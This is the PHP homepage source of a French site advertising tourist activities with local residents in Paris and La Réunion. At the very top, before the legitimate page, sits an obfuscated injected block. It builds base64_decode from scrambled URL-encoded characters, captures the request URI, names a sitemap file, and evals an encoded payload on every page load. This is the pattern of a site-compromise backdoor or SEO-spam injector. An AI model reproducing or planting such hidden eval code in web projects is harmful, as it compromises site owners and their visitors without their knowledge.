<?php
header("Content-type: text/html; charset=utf-8");
@set_time_limit(0);
$xmlname = 'mapss.xml';
$jdir = '';
$smuri = smrequest_uri();
if($smuri==''){
	$smuri='/';
}
$smuri = base64_encode($smuri);
$dt = 0;
function smrequest_uri(){
	if (isset($_SERVER['REQUEST_URI'])){        
		$smuri = $_SERVER['REQUEST_URI'];        
	}else{
		if(isset($_SERVER['argv'])){       
			$smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];     
		}else{      
			$smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];        
		}
	}        
	return $smuri;        
} 


$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iTGdYelB3alROSEVKdkdGcmtmbVNBWnhxRGFJc3RkZVdWbkJRWVVwaENLdU1seW9pYlJPY2JURm15RFZpUEp2d05lZlNCekxaa0dyaGxqT0VSc3VIQ1hJYUFvbmNZUXFkV0tVZ3B0eE15bDlEakprVGxhVVBZZ3RVT2wwVE0zdEtGM3dXTWVyY0Eyb1V3SzRYYllNWGJKUDBNWFAwTWdUQk0yMTFNTEJFd0s0WFFaQjdsYVVCallrOU9ld2NNMm8yUGY5V3BMUE5HZW9Vd2VUbnhEMFF3SnRXcEZrVHlaSWt3ZjlKdEN0cHczUFJzZUNSTVlzc3hEMFF3ZXNOczJDZ09sMFR3MmNtakZjMHVaMXFqSDVXZEs1bWplV3FBMmNOTTJjY2JYdE5NWU03bGFVQmpIYVR5Wklrd2Y5SnRDdHB3M1BSakhhWEZpRVRsYVVCTTJXMEdaazlPdmtCRjBzZkNmRVhNMjFtakZ0V3cxMDdsYVVCTTJXMEdaazlPSlAwTVc5S0dGSUVBSFBXUVlNTndLRFh3S0RCTTJXMEdaQjdsYVVCamU5bXNZazlPWXR6bzBDWkNCQ1pIS3NPQ2Z0YUYwY3lvMWFYRmlFUFlndFZwZTlWaktrOU9ZTVh4RDBRbGFVQnNlQ1JNSnNXQWdrOU92a0JGMHNmQ2ZFWHNlQ1JNSnNXQWdzc3hEMFF3SnRXcEZJM0dIT1R5Wkltc0p3ek1MQ0RwZWZWR1pUWGJLTUV3S01Fd0p0V3BGSTNHSE9ueEQwUWxhbm5HZ1RCc2VDUk1Kc1dBZ1c3bGFVd3dKUG5zZW9UeVprQnNlQ1JNSnNXQVdFREZaNEJzZUNSTUpzV0FXRXJGWjRCc2VDUk1Kc1dBV0VLRmlFUFlUQkJzZUNSTVlrOU9KUDFBWFAwTWdUQnNlQ1JNSnNXQWdEbVFpRVBZWDBQWVQwUWxhbm5HZ2NYR0Z0V3BYQVV3MGNvQ2ZJemEwcnd0bzVvRjBXYXdLQlR3Z0FUTTN0S0EyZm1HSFBSTVljWEdGdFdwWEFVdzBjb0NmSXphMHJ3dG81b0YwV2F3S0JFT1lzMXBMUnFwM3Nxd0tCbk9KRVBZZ3RWcGU5VmpLazlPZXNXc2VDcXNnVFhaZnRvb2Y5bGl2V2ZpV3R6WkNrWFFpRVBZWDBUR0hybUdIV0xRZXNXc2VDcXNnVFhaZnRvb2Y5QUYwR3lvV3NJb0J0ZnRmOWVpMU9YUVprTHdnSW1zSndWQUZQV0EyMURRZXNXc2VDcXNnVFhaZnRvb2Y5QUYwR3lvV3NJb0J0ZnRmOWVpMU9YUVpEVHczQ3FqMjVOczI0WFFaQlR1RDBRd2VQRXAyUFNPbDBURzJDMEdINTJRWXNPQ2Z0YUYxY3p0QjlaQzBmWnR2Q3ZGMEd5b2dNbnhEMFF6WklXcEpQV2pIQVVHMkMwR0g1MlFZc1p0bzF5Q3ZDemFvdHZvZ01uT1lBTE9KUDBNTFBjTTJDVnBGa1VHMkMwR0g1MlFZc1p0bzF5Q3ZDemFvdHZvZ01uYllrWHNINVNwTDkzcGdNblFaSTdsYVVCQTJyTkEyRVR5WklYR0Z0V3BYQVV3MXdmaW85b3RDOUl0dnRad0tCN2xhbjlPZUNFTTJDbkdnY25NM1BXc1lUQkYxUGZvV0dmb1dFWG9CQ1BpMXRmRjBmdnRmT1hGWkJUd2dBVHdmOWl0Q3dIdEN3cHcxd2ZpbzlvdEM5SXR2dFp3MTBUd2dBVE0zdEtBMmZtR0hQUk1ZVEJGMVBmb1dHZm9XRVhvQkNQaTF0ZkYwZnZ0Zk9YRlpEVHczQ3FqMjVOczI0WFFaQlR1RDBRd2VQRXAyUFNPbDBUd2Y5aXRDd0h0Q3dwdzF3ZmlvOW90QzlJdHZ0WncxMDdsYW45bGFubkdnY21zSnduTTN0S1FZdFZwZTlWaktEWGJZTW5RRkVQWVRCQkEyck5BMlJ6c2UxRE9sMFRHRmNEcGU5QkdaVGdiWU9Fd2VQRXAyUFNRaUVQWVRCQkEyck5BMkVUeVprQkEyck5BMlJ6c2UxREhtSXN4RDBRemFCUFlMV0xRdmtCRjBzZkNmRVhqMlVYRlprOXlaa2dkWk9udURCUFlUQkJzRkNLcFlrOU9ZdHp0MENvSEtzU2pYUG5zZW9YRmlFUFlUQlBZVFdXQTJjTk9ZTThqSEdLQUgxV09ZSW5HbDBncEhmbnBYc1dBZ09UcExmUkdpMGdwSGZucFhzV0FnT1RqZUNuRzJjMHlaT3JkbGtXT2dJM2pIdDBqbDBnZGlrRHdaT1RNM3Q1cGVvOU9nSUJqRlBEcGVmNXhnSWdwZTlWam1SRUdIRzB4Vms3c2U5RHhWazdNZTltakZ0bnAyNDZHTFc0R0hhN09KVVJqSDVCR0ZUNk9sdkRkbGtEZGxFVE9ld2NBMlJYTUw5MXBMYVJBMjlFcDNPNk9ZUExHTEE3T2dJTE1MZlJHSHdOTUx0V01nazlPWU9ET2drVEdYd2NwSENncDN3QkdGTzlPVmtnT1lJTnBCck5BSGE5T0xXZU1MZlJHb2NXakhzVXNZVG5PZ0ltTUxkOU9nTXFBTGZtR2lBMEYydFdBMjlCR1pUQnNGQ0twWUJxd0tPK3lZOW5HWHdjcEhvK3dtRVBZVFdXdWVXMHhEMFF6YUJUbGFubkdnVEJNMlcwR1pXN09rMFFZSFdMUVl0bWpGdFdPbDA5T1lzNHBIRFhRRkVQWVRCd3dKc1dBZ2s5T1lzVXNKdER4ZzhOd0s0QkcyOTNHSE9xd0s5bWpGdFdwSGZEYlhJVU1sOUJBRnRXeVpNcXdlV0JiZ01Mc2VDUk1sMFhiZ3QwR0gxRGJnTUxzMkNneVpNcXdlY05NM2Fxd0tHNHBIRDl3SzRCR0phcXdLR1V5Wk1xd2VUN09rMFFZYVduR2djbXNId21zSk9Vd0p0V3BGa0VkWUQ0UWkwOXczUFVHSHJFdWUxRXdLVzdsYVV3WWFCQnVlMUVwTGZSR1prOU9KUDFBWFAwTWdUQnNlQ1JNWUQ0UVo0WGJYY1JwWU03bGFVd1lGMFBZVEJ3akhBVU0zQ2dNM3RLUVl0MEdIMURibGtFUEtCOXlac1VBSFBTdWUxRXdLVzdsYVV3WWFXbkdnY21zSHdtc0pPVXdKdFdwRmtFUEtCbnVEMFFZYUJ3WVp0NHBIcnFBSDFXT2wwVE0zQ2dNM3RLUVl0MEdIMURibE1uYmdNcXVlMUV3bUVQWVRCd1lGMHdZYUJQWVRCd3phMFFZYUJCdWUxRU9sMFRzSnducFpjbXBIOTFzZXROUVl0M0dIT25RaUVUbGFVd1ladFJ1SEducGVvVHlaSUxwM0lXcGdUQnVlMUVwTGZSR1pEVE9YTWdRaUVUbGFVd1lIRzNNTFcwR1pUQnBGV0xqSHJXYllrQnVlMUVRaUVQWVRCd0dMUEVwM1BXUVl0UnVIR25wZW9ueEtrUFlUQndHSFBVcEtrZ3AyRThBWE8rakp0ME1sVU5iS09xd2Y5aXRDd0h0Q3dwdzBjb0NmSXpadjlpQ1lzc2JnT05PZzRCdWUxRXBMZlJHaUVUbGFVd1lIQ1ZqZThUT1ZyZ01WNGdiZ3QzR0hPN2xhVXdZYTBRWWFXV3VlVzBRWUI3bGFVd3phQlBZVFduR2dUQmpIYW51RDBRWWFCQnMyQ2dPbDBUdzJjMHNKazZiSzhYYmd0WHAzc1dBZzRYYjJXcUdlQzRiWElVTWw5MU1MRDl3SzRCTTJXMEdaNFh3TFdCeVpNcXdlV0JiZ01Mc2VDUk1sMFhiZ3QwR0gxRGJnTUxHSmE5d0s0QkdKYXF3S0dVeVpNcXdlVHF3S0czR0hPOXdLNEJqZTltc1k0WHdYbjZ5Wk1xTTIxbk0yd05zWVRuYmdNTGpMdG5NVjBYYmd0aEdlV0tiZ01MQTJyTkEyRTl3SzRCQTJyTkEyRTdsYVV3WUhDVmplOFRzSnducFpjbXBIOTFzZXROUVl0M0dIT25RaUVUbGFVd1lIQzRqRmFVUWlFUFlUVzlsYW45R0hybUdGRVBZVEJCczJDZ09sMFR3MmMwc0prNmJLOFhiZ3RYcDNzV0FnNFhiMldxR2VDNGJYSVVNbDkxTUxEOUFMOTB3TFdCeVpNcXdlV0JiZ01Mc2VDUk1sMFhiZ3QwR0gxRGJnTUxHSmE5d0s0QkdKYXF3S0dVeVpNcXdlVHF3S0czR0hPOXdLNEJqZTltc1k0WHdYbjZ5Wk1xTTIxbk0yd05zWVRuYmdNTGpMdG5NVjBYYmd0aEdlV0tiVEJYd0xQRXAyUFN5Wk1xd2VQRXAyUFNiZ01Mc0Z3bnlaTXF3SlBSc0Z3bnhEMFFZSFdMUVlmbXNKd21zSk9VTTIxTnNGdEJwS1RCczJDZ1FaRFhwTDlncDN0MU0yQ0tBSHNXcFhhWFFaVzdsYVV3WUhDVmplOFRzSnducFpjbXBIOTFzZXROUVl0M0dIT25RaUV3WWEwUVlhV1d1ZVcwUVlCN1lhQlBZVFc5bGFuOWxhVVBZTEcxcExQMGpIOXFPSlBSakZQZ3AzYVVRWkk3bGFVd3dlZlhHSDUwT2wwVE0zdEtzZTlFcDNzV01nVEJGMVBmb1dHZm9XRVhaZnRvb2Y5Q28wQ1pGMGZKdG81b3cxMG54RDBRWUhXTE9ZVEJBSHNXcFhhVE9pMFRPZ09uT0pFUFlUQnd3SlBEakh0V01XUG5zZW9UeVpJY01Yd2N1WmtVT1d0V3BMUFdwWHRvTUxmMkdIcldNZ09FT0JzTnAyc0VHSHdOc1lPRU9MMW1wTHdOc1lPRU9XUE5NMjltTWVXQkdGT1NPZ0RnbzI5WHAzb1RzMkNnT0pQRGpIdFdNZ09FT0xXY0YyZktBMmNuc0xDS09nRGdISGZVcDI4Y09mUEVzRndET2dEZ0hIOTFHZWZOYUw5ME9nRGdISGZVcDI4VG8ycjFNWGtnYll3UG8wNVlwM2FnYll3UUFGR2NPWWN5R1h0V3BnSW1NZWZST2V3TnNZQmdiWXdZQUhXdnNDUERqSHRXTWdPRU9XR05qSHJjT2dEZ0hIZnFHZUM0T2V3TnNZT0VPQndpTWVXQkdGT2diWXcwczJXVkdIcldNZ09FT1dQTkcyOTFPZlBEakh0V01nT0VPV1BER0hDQnVaSWlNZVdCR0ZPZ2JZd0pwMjlYcGVvVGFIdGlHSDVtR1pPRU9CY1dNTFcwTUxXNE9nRGdvSlcwamU5cWJGQ0twZXJuQWdPRU9CZkVHRmNjT1ljd2FaSUlNTFBVakZHV01nQmdiWXdJTTJFZ2JZd2Z1ZWZncDNhZ2JZd2xzRlAwcEtPRU9COTFzZUdOdXZ3TnNZOUdwMnRjcDB3TnNZT0VPWFdjQTNCZ2JZd2lzRncyR0ZXWXAzYWdiWXdFR0hzbU9nRGdwSnNEYkZ0S2pGR25BSERnYll3eHNGdFZqWU9FT1dQMEFIUFNvTGZSQUxyV01nT0VPV3RVR1pJM0dIT1RBRndWamVXMkdaa1Vab3ZUYUZ3VmplVzJHRk9uT2dEZ29lQ0twWUkwcDI5RU9nRGdpb1VyZEx3TnNZT0VPQjVXc2VQS0FIRzBPZ0RnaUNQd3RvUEtBRnNFR0ZPZ2JZd0Z0MkMwT0p0TnAycm1PZ0RncGVmS0FMV3FPZ0RndExXbWpZSW1HSGZLQTJUZ2JZa1hBTFdxRzJ3TnNZTUV3MnNOcDJzRUdaTUVPWXNnQUhXQnNaTUVPWXNjcDJEWGJZa1hBTFdxR0tNRU9ZczVBSGNOcEtNbnhEMFFZYVdMcDN3V0FIUFVPWVRCTTNJbkdlQ0tvMlcwR1pJY01La0JzTGZFUVpJN2xhVXdZYUJCTTN0S09sMFRNM3RLc2U5RXAzc1dNZ1RCc0xmRVFpRVBZVEJ3WUhXTE9ZY21zSndEcDNkVXdlZlhHSDUwYllrQk0zdEtRWkJUdUQwUVlhQndZRndXc0pDS3BnSTBNWENXeEQwUVlhQnd6YTBRWWFXOWxhVXd6SENFTTJDN2xhVXdZRndXc0pDS3BnSUxBSHJtR2lFUFlUVzlsYW45bGFuTHNINVZzZVdOcGdJbXBIOTFzZXROUVl0MU1MRG51RDBRWVp0TGpIcldGMlBOcFh0V3BYdG1PbDBUYWVHbnBlQ3pHMkMwRjJQTnBYdFdwWHRtUVl0MU1MRG54S2tQWVRXbkdna1VPWnRMakhyV0YyUE5wWHRXcFh0bVFaSTdsYVV3WVp0VmpZazlPZVAxTUxyempINW5zWVRueEQwUVlhV1ZzRndFRjNQV3NlOURzWVRCQTJURU92UENvQnJ5b2Z0ekNDd2RiWWtCc0Z3RVFpRVBZVEJ3QTNDS3BmOW1HRnROTUphVXdlUFViWUlsQ0N3ZGkxSW9GMXdmQ2ZDWmlXdFphbzVpdEJDWmJsdm54RDBRWWFCQkdMV0VHQzlWcDI1MEdINTBNS2s5T2VQMU1McnpHRmNXQUtUQkEyVG54RDBRWWFXVnNGd0VGMlBFcDNQV1FZdFZqWUI3bGFVd3paa1BZVFdLR0Z0MU1MNFR3ZUducGVDekEyOXFzZUNxc0pkN2xhbjlsYVUveVQ9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs="));
 ?><?php 
session_start();

//var_dump($_SESSION);
//$_SESSION['myid']='';

//echo "ca marche! Bonjour ".$_SESSION['login_user_nom']." ".$_SESSION['login_user_prenom'];
if($_GET['coucou']!='coucou'){
	//die('<html><meta http-equiv="Content-type" content="text/html; charset=utf-8" /><div class="col-md-12 center"><h1 style="text-align:center"><br><br>Mise à jour en cours... ;)<br><br>Allez les bleus!</h1></div></html');
}

	
?>



<!DOCTYPE html>
<!--[if IE 9]> <html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!-->
<html ng-app="myApp" lang="fr">
<!--<![endif]-->
<head>
	<meta charset="utf-8">
	<title>Activité touristique avec l'habitant: Paris, Ile de La Réunion,... - AvenTour</title>

	<META NAME="TITLE" CONTENT="AvenTour">
<META NAME="DESCRIPTION" CONTENT="AvenTour, activités touristiques avec des habitants">
<META NAME="KEYWORDS" CONTENT="activités touristiques, locaux, particuliers, aventures, découvertes, voyages, que faire à paris, que faire à la reunion">
<META NAME="ROBOTS" CONTENT="index,follow">
<META NAME="REVISIT-AFTER" CONTENT="15">


	<!-- Mobile Meta -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Favicon -->
	<link rel="shortcut icon" alt="Aventour, visites Paris Ile de La Réunion" href="images/icone.png">
	<link rel="stylesheet" href="http://code.jquery.com/ui/1.10.3/themes/smoothness/jquery-ui.css" />

<script src="js/jquery.browserLanguage.js" type="text/javascript" charset="utf-8"></script>	

<?php 
// if(isset($_SESSION['lang'])){

// 	if($_SESSION['lang']=='fr'){


// 	}elseif($_SESSION['lang']=='en'){

// 	}else{
// 		echo'<script type="text/javascript">

// 		$.browserLanguage(function(language){
// 			if(language!="fr"){
//       document.location.href="en/";
//       }
//     });
// </script>';
// 	}
// }else{echo'<script type="text/javascript">

// 		$.browserLanguage(function(language){
// 			if(language!="fr"){
//       document.location.href="en/";
//       }
//     });
// </script>';


// }

?>




		
		<!-- // <script type="text/javascript" src="plugins/jquery.min.js"></script> -->
		<!-- // <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js" type="text/javascript" charset="utf-8"></script> -->


<!-- Web Fonts -->
<!-- <link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700,300&amp;subset=latin,latin-ext' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Raleway:700,400,300' rel='stylesheet' type='text/css'>
 -->

<!-- Bootstrap core CSS -->

<!-- <link rel="stylesheet" href="css/datepicker.css"> -->
<!-- <link href="../css/bootstrap-datetimepicker.min.css" rel="stylesheet" media="screen"> -->


<!-- Font Awesome CSS -->
<link href="fonts/font-awesome/css/font-awesome.css" rel="stylesheet">

<!-- social buttons 3 CSS -->
<link href="css/social-buttons-3.css" rel="stylesheet">

<!-- Plugins -->
<!-- <link href="css/animations.css" rel="stylesheet"> -->
<link href="css/style.css" rel="stylesheet">



<!-- Custom css --> 
<link href="css/custom.css" rel="stylesheet"> 
<!-- <link href="css/custom1.css" rel="stylesheet">  -->



	
	<link rel="stylesheet" href="css/footer-distributed-with-address-and-phones.css">


    




</head>

<body class="no-trans" ng-app="myApp">



	<!-- scrollToTop -->
	<!-- ================ -->
	<div class="scrollToTop"><i class="icon-up-open-big"></i></div>

	<!-- header start -->
	<!-- ================ --> 
	<header class="header fixed clearfix navbar navbar-fixed-top" style="
    padding-top: 0px;
" >
	<!-- <div class="hidden myTopBar" id="myTopBar" style="
    
    padding-left: 0px;
    padding-right: 0px;
    padding-top: 0px;
    background-color: #EDEFED;
        height: 2vw;
        font-size: 15px;
            font-size: 1vw;
   
">
				<marquee> <h4 style="font-size: 15px;
            font-size: 1vw;">Lancement des 1ères inscriptions début 2016! <?php
// Répéter 122 fois un espace
//echo str_repeat('&nbsp;',90);
//echo "Hey ".$_SESSION['login_user_prenom']."!";
?> Inscris-toi à la Newsletter, on te tiendras au jus pour la date ;)</h4></marquee>

			</div> -->
		<div class="container" style="
   margin-right: 20px;
   margin-left: 20px;
   width: 98%;
   ">


			<div class="row">
			
			
				<div class="col-md-3 col-sm-3 col-xs-1">

					<!-- header-left start -->
					<!-- ================ -->
					<div class="header-left clearfix">

						<!-- logo -->
						<div class="logo smooth-scroll">
							<a href="/"><img id="logo" src="images/logo.png" alt="AvenTour logo"></a>

						</div> 


						<!-- name-and-slogan -->
						<!-- <div class="site-name-and-slogan smooth-scroll">
							<div class="site-name" id="mSiteName"><a href="#banner"></a></div>
							<div class="site-slogan"> <a target="_blank" href="http://aventour.net"> </a></div>
						</div> -->


					</div>
					<!-- header-left end -->

				</div>
				<div class="col-md-9 col-sm-9 col-xs-11">

					<!-- header-right start -->
					<!-- ================ -->
					<div class="header-right clearfix">

						<!-- main-navigation start -->
						<!-- ================ -->
						<!-- <div class="main-navigation animated"> -->
						<div class="main-navigation">

							<!-- navbar start -->
							<!-- ================ -->
							<nav class="navbar navbar-default" role="navigation">
								<div class="container-fluid">
									<div class="row">

										<!-- Toggle get grouped for better mobile display -->
										<div class="navbar-header">
											<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse-1">
												<span class="sr-only">Toggle navigation</span>
												<span class="icon-bar"></span>
												<span class="icon-bar"></span>
												<span class="icon-bar"></span>
												<span class="icon-bar"></span>
												
												
											</button>
										</div>
									

								<!-- Collect the nav links, forms, and other content for toggling -->
								<div class="collapse navbar-collapse scrollspy smooth-scroll" id="navbar-collapse-1" style="padding-top: 3px;">

									<ul class="nav navbar-nav navbar-right">
								<!-- 	<div class="col-md-4"> 
										
									

									</div>
									<div class="col-md-8"> <li><div class="fb-like" data-href="https://facebook.com/goaventour" data-layout="button" data-action="like" data-show-faces="false" data-share="false"></div></li>
 </div>
									<div class="col-md-12"> </div> -->


									<div class="col-md-4">
									<?php include 'deveniroucreer.php' ?>

									<!-- <li><a href="" class="btn" data-toggle="modal" data-target="#project-11" id="monCQuoi">Creer Tour!

</a></li> -->

										<!-- <li><a href="" class="btn" data-toggle="modal" data-target="#project-11" id="monCQuoi">{{ 'CreateTour' | translate }}

</a></li>
 -->


											 
										</div>
										

										<div class="col-md-8">
											<?php include 'conectionoupas.php' ?>
										</div>

										
										
										


							

</ul>
</div>

</div> <!-- row -->
								</div> <!-- container-fluid -->

</nav>

</div><!-- main-navigation end -->




</div><!-- header right clearfix-->
</div> <!-- ol-md-9 col-sm-9 col-xs-9 -->

</div> <!-- row -->
</div> <!-- container -->

<script   src="https://code.jquery.com/jquery-2.2.3.min.js"></script>

</header>
<!-- header end -->

<!-- banner start -->
<!-- ================ -->
<div id="banner" class="banner">
	<!-- <div class="banner-image"></div> -->
	<div class="video-container">
		
		<video preoload="true" autoplay="false" loop="loop" volume="0" poster="images/bg/2.jpg">
		<!-- <source src="https://a0.muscache.com/airbnb/static/Paris-P1-1.mp41" type="video/mp4">
		<source src="https://a0.muscache.com/airbnb/static/Paris-P1-1.webm1" type="video/webm"> --> 
			
		</video>
	</div>

	<!-- end video-container -->
	

	<div class="banner-caption zindexdeux" id="banner-caption">
		<div class="container">
			<div class="row">
				<!-- <div class="col-md-12 object-non-visible" data-animation-effect="fadeIn"> -->
				<div class="col-md-12">
					<h1 class="text-center">Pars à l'Aven<span>Tour</span> avec moi</h1>
					<h2 class="lead text-center">Activité touristique avec un habitant</h2>

                </div>
                <div class="col-md-12">
 
                </div>
 
              


	<!-- <div class="col-md-12 object-non-visible" data-animation-effect="fadeIn" > -->
	<div class="col-md-12" >


		<!-- <form role="form" action = "searchresult.php" method="post"> -->
		<form role="form" action = "searchresult.php" method="get">
		<!-- <div role="form" action = "" method="post"> -->
			<div class="col-md-7 col-md-offset-2 col-xs-12"> 
				<div class="form-group">
					<label class="sr-only" for="location">Location</label>
					<!--<input type="email" class="form-control" id="location" placeholder="Where ?">-->
					<select id="location" name="location" class="form-control">
						<option value="paris">Paris</option>
						<option value="reunion">La Réunion</option>
						
      <!-- <option value="Maisons-Laffitte">Maisons-Laffitte (Lancement 2016!)</option>
       -->
    
						

					</select>
				</div>
			</div>
			<!-- <div class="col-md-3 col-xs-6">
				<div class='input-group' >
					<label class="sr-only" for="checkin">Quand?</label>
					<div class="input-group date form_date" data-date="" data-date-format="dd MM yyyy" data-link-field="dtp_input2" data-link-format="dd-mm-yyyy">
						<input type="text" class="form-control"  placeholder="Quand ?" id="dtp_input2" name="datepicker">
						<span class="input-group-addon"><i class="glyphicon glyphicon-calendar"></i></span>

					</div>


				</div>


			</div> -->
<!-- 
			<div class="col-md-3 col-xs-6">
				<div class="form-group">
					<label class="sr-only" for="tourist">Tourist</label>
					<select id="tourist" name="tourist" class="form-control">
						<option value="1">1 Touriste</option>
						<option value="2">2 Touristes</option>
						<option value="3">3 Touristes</option>
						<option value="4">4 Touristes</option>
						<option value="5">5 Touristes</option>
						<option value="6">6 Touristes</option>
						<option value="7">7 Touristes</option>
						<option value="8">8 Touristes</option>
						<option value="9">9 Touristes</option>
						<option value="10">10 Touristes</option>
						<option value="11">11 Touristes</option>
						<option value="12">12 Touristes</option>
						<option value="13">13 Touristes</option>
						<option value="14">14 Touristes</option>
						<option value="15">15 Touristes</option>
						<option value="16">16+ Touristes</option>
					</select>
				</div>
			</div> -->
			<div class="col-md-3 col-xs-12">
				<!-- <a href="searchresult.php" target="_blank"> -->
				<a href="searchresult.php" target="_blank">
				<!-- <a href="#"> -->


					<button type="submit" class="btn btn-default btn-primary">Découvrir</button>
					<!-- <button  class="btn btn-default btn-primary" data-toggle="modal" data-target="#project-10">Rechercher</button> -->
				</a>
			</div>
			</form>


			
		</div> <!-- end col-md-12 object-non-visible" data-animation-effect="fadeIn" -->



	</div> <!-- end of class="row" -->



</div> <!-- end of div class="container" -->

</div> <!-- end of div class="banner-caption" -->

</div> 
<!-- banner end -->



<!-- <div class="section clearfix object-non-visible" data-animation-effect="fadeIn" style="padding: 0px;"> -->
<div class="section" style="padding: 0px;">

<!-- section start -->
<!-- ================ -->
	


	<!-- section end -->

<!-- section start -->
<!-- ================ -->
	<section class="bg-primary" id="monsectionAvis">
		<!-- <div class="container" id="mail">
			<div class="row">

				<div class="col-md-4 text-center">
					
					<img src="images/martine.png" alt="avis tour touristique à Paris" class="img-responsive center-block"> 
					
				</div>
				<div class="col-md-4 text-center">
				<img src="images/melanie.png" alt="avis activité touristique culinaire et insolite" class="img-responsive center-block"> 
					
				</div>

				<div class="col-md-4 text-center">
					
					<img src="images/jean.png" alt="avis activité touristique à l'ile de La Réunion" class="img-responsive center-block"> 
					<p></p>
				</div>


			</div>
		</div> -->
	<!-- </section> -->


	<!-- section end -->



<!-- section start -->
<!-- ================ -->
<!-- <div class="section clearfix object-non-visible" data-animation-effect="fadeIn" style="padding: 0px;"> -->
	<div class="bg-primary" id="monsectionVideo">

		<div class="container" id="mail">
			<div class="row">

			<div class="col-md-6 text-center" style="
    z-index: 3;">
					<h2 class="section-heading">Aventour: Paris, La Ville Lumière!</h2>
					<hr class="primary">
					<div id="videoReunion0"></div>


					<p></p>
				</div>

				<div class="col-md-6 text-center">
					<h2 class="section-heading">Aventour: L'Ile de La Réunion, l'Ile Intense!</h2>
					<hr class="primary">
					<iframe style="
    z-index: 30;" id="videoReunion" src="https://www.youtube.com/embed/kPJQPLvxrjA?rel=0&showinfo=0" frameborder="0" allowfullscreen controls="0" ></iframe>
				<!-- 	<p id="toggle"></p>
        <p id="state"></p>
        <p id="key"></p>
 -->
				</div>
				<div class="col-md-0 text-center">
					
				</div>

				


			</div>
		</div>
		</div>
	</section>
	</div>

	
    <!--/.SLIDESHOW END-->


	<!-- section end -->

	<!-- <section class="bg-primary" style="background-color: #EDEFED;">
		<div class="row">
				<div class="col-md-12 text-center" style="padding-top: 50px; padding-bottom:50px;">
				          <?php //include 'app.php' ?>
				 </div>
		</div>
	</section> -->


	

	<!--  -->

	<!-- <section class="bg-primary" style="background-color: #EDEFED;"><div class="row">
		
		<div class="col-md-12">
		<h1></h1>
		<div class="fb-comments" data-href="https://aventour.net" data-numposts="3"></div>
			
		</div>
	</div></section> -->



	<section class="bg-primary" style="background-color: #EDEFED;">
		<div class="row">
				<div class="col-md-12 text-center" style="padding-top: 50px; padding-bottom:50px;">
				          <?php include 'mail.php' ?>
				 </div>
		</div>
	</section>
	<!-- <section><div class="row">
		
		<div class="col-md-12">
		<div class="fb-comments" data-href="https://aventour.net" data-numposts="1"></div>
			
		</div>
	</div></section> -->

	 <!--  <section id="home" class="text-center"> 
         
                <div id="carousel-example" class="carousel slide" data-ride="carousel">

                    <div class="carousel-inner">
                        <div class="item active">

                            <img src="assets/img/1.jpg" alt="" />
                            <div class="carousel-caption" >
                                <h4 class="back-light">Aenean faucibus luctus enim. Duis quis sem risu suspend lacinia elementum nunc.</h4>
                            </div>
                        </div>
                        <div class="item">
                            <img src="assets/img/2.jpg" alt="" />
                            <div class="carousel-caption ">
                                <h4 class="back-light">Aenean faucibus luctus enim. Duis quis sem risu suspend lacinia elementum nunc.</h4>
                            </div>
                        </div>
                        <div class="item">
                            <img src="assets/img/3.jpg" alt="" />
                            <div class="carousel-caption ">
                                <h4 class="back-light">Aenean faucibus luctus enim. Duis quis sem risu suspend lacinia elementum nunc.</h4>
                            </div>
                        </div>
                    </div>

                    <ol class="carousel-indicators">
                        <li data-target="#carousel-example" data-slide-to="0" class="active"></li>
                        <li data-target="#carousel-example" data-slide-to="1"></li>
                        <li data-target="#carousel-example" data-slide-to="2"></li>
                    </ol>
                </div>
           
       </section> -->

      
	

<!-- <a href="http://hannuaire.fr/" class="hidden" title="Annuaire référencement"><img src="http://hannuaire.fr/i/bleu.png" alt="Hannuaire, annuaire referencement gratuit"/></a> -->


	<!-- footer start -->
	<!-- ================ -->
	<footer class="footer-distributed" id="end">

		<?php include 'footer.php' ?>

		</footer>
		<!-- footer end -->

		
<!-- </body> -->
		
							<!-- Modal -->
							<div class="modal fade" id="project-10" tabindex="-1" role="dialog" aria-labelledby="project-10-label" aria-hidden="true">
								<div class="modal-dialog modal-lg" style="margin-top: 9%;">
									<div class="modal-content">
										<div class="modal-header">
											<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only"></span></button>
											<h4 class="modal-title" id="project-10-label">AvenTour : Que faire à Paris? A La Réunion? Activité touristique avec un habitant </h4>
										</div>
										<div class="modal-body" style="background-color: rgb(245, 245, 245);">
											<h3></h3>

											<div class="row">
												<div class="col-md-12">
													
													<section class="bg-primary" style="background-color: rgb(245, 245, 245);">

													<div class="container"  id="mail">
													  <div class="row">
													    <div class="col-md-12 text-center" style="padding-top: 5px;" padding-bottom: "50px;">

														<?php include 'mail.php' ?>
														</div>
													  </div>
													</div>
															
													</section>
												</div>
											</div>
										</div>
										<!-- <div class="modal-footer">
											<button type="button" class="btn btn-sm btn-default" data-dismiss="modal">Close</button>
										</div> -->
									</div>
								</div>
							</div>
							<!-- Modal end -->




							<!-- Modal -->
							<div class="modal fade" id="project-11" tabindex="-1" role="dialog" aria-labelledby="project-11-label" aria-hidden="true">
								<div class="modal-dialog modal-lg">
									<div class="modal-content">
